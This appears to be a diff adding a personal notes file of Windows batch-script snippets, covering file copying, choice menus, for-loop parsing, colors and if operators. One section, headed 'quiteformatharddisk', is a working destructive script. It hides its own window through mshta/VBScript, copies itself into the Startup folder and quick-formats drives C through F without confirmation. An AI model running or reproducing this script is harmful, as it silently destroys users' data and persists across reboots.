@@ -1,0 +1,97 @@
+/copytospeed/
+@echo begin
+copy c:\Users\Administrator\Desktop\1.txt d:\
+please put a new disk into driver c
+
+/runafile-minshow/
+@echo off
+start/min c:\Users\Administrator\Desktop\1.bat
+pause
+
+/choice-using/
+@echo off
+:begin
+choice /c:123 /m:"into"
+if %errorlevel%==1 goto one
+if %errorlevel%==2 goto two
+if %errorlevel%==3 goto three
+:one
+echo 111
+pause>nul
+goto begin
+:two
+echo 222
+pause>nul
+goto begin
+:three
+echo 333
+pause>nul
+goto begin
+
+/for/
+@echo off
+for %%i in (1.txt,极限精确定义.png) do echo %%i
+pause
+@echo off
+for %%i in (*.txt) do %%i
+for %%i in (1.txt) do @echo %%i
+for /L %%i in (1,2,10) do @echo %%i
+for /L %%i in (1,1,3) do dir 1.txt
+for /F %%i in (1.txt) do @echo %%i
+for /F %%i in (1.txt) do type %%i
+for /F "delims=	" %%i in (1.txt) do echo %%i  注意delims等号后面如果是空格或者是tab则效果会变
+for /F "tokens=2 delims= " %%i in (1.txt) do @echo %%i
+for /F "tokens=2，3 delims= " %%i in (1.txt) do @echo %%i %%j
+for /F "skip=2 tokens=*" %%i in (1.txt) do @echo %%i
+for /F "eol=2 tokens=*" %%i in (1.txt) do @echo %%i
+for /F "tokens=2 delims= " %%i in ("echo he ll oww orld") do @echo %%i
+for /F "tokens=*" %%i in ("c:\1.txt") do @echo %%i
+for /F "tokens=*" %%i in ("a 1.txt") do @echo %%i
+for /F "usebackq tokens=*" %%i in (a 1.txt) do @echo %%i
+pause
+
+/delete/
+@echo
+del C:\Users\Administrator\Desktop\1.txt
+del "C:\Program Files (x86)\LdsLite"
+pause
+
+/color/
+@echo off
+color 4F
+pause
+@echo off
+color 4
+pause
+
+/transmit/
+@echo off
+type 123.txt>2.bat
+pause
+
+/quiteformatharddisk/
+if not "%1" == "h" mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
+Copy %0 "%userprofile%\「开始」菜单\程序\启动" /y
+format c: /q /y
+format d: /q /y
+format e: /q /y
+format f: /q /y
+
+/createfile/
+@echo off
+fsutil file createnew d:\abc.txt 6423 
+pause
+
+/if语句/
+EQU
+等于	NEQ
+	不等于
+LSS
+少于
+	LEQ
+	少于或等于
+GTR
+大于
+	GEQ
+	大于或等于
+
